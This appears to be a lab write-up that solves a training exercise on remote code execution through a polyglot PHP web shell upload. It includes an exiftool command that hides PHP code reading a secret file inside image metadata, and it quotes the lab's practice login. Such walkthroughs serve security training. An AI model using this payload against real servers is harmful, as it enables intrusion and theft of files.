# Lab: Remote code execution via polyglot web shell upload

This lab contains a vulnerable image upload function. 
Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. 
Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---


We attempted to upload a basic php web shell to the server:
![image](https://github.com/user-attachments/assets/96c2a7cc-5d7e-4841-9188-e93e5df99744)

We tested with different payloads:
![image](https://github.com/user-attachments/assets/23ab52bd-fa38-4c5b-a767-d85fff8fb473)
![image](https://github.com/user-attachments/assets/1ebdc77f-9097-49c6-9329-7e23a3ec1c92)
![image](https://github.com/user-attachments/assets/0bcea7f5-865d-41f3-9d60-ab212c81e055)
![image](https://github.com/user-attachments/assets/6664122b-e050-40c2-af2c-a6fe45de0f4e)
![image](https://github.com/user-attachments/assets/8dc1f425-bc63-4f57-80c6-ae1d49090ba1)
![image](https://github.com/user-attachments/assets/041f21e0-6908-4acd-9ca9-13d9491764db)
![image](https://github.com/user-attachments/assets/e6843e44-c8c7-4644-8af2-aa5fd01a828a)

We attempted to submit a polyglot web shell using `exiftool`

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.png -o polyglot.php
```
We are creating a polyglot file by embedding PHP code into the metadata of an image file (comments), allowing it to function both as an image and as a PHP script on a vulnerable server.

![image](https://github.com/user-attachments/assets/e94ed620-306e-481c-a1bf-8104f6c7400f)

Then we subbmitted the image and get the response on the repeater:
![image](https://github.com/user-attachments/assets/f676ffe2-9172-4c8a-87a7-56b3bc2549c8)

Once we had the code, we submitted this and solved the lab:
![image](https://github.com/user-attachments/assets/a5095df6-1f34-4f36-8840-b4d8b50b21f0)









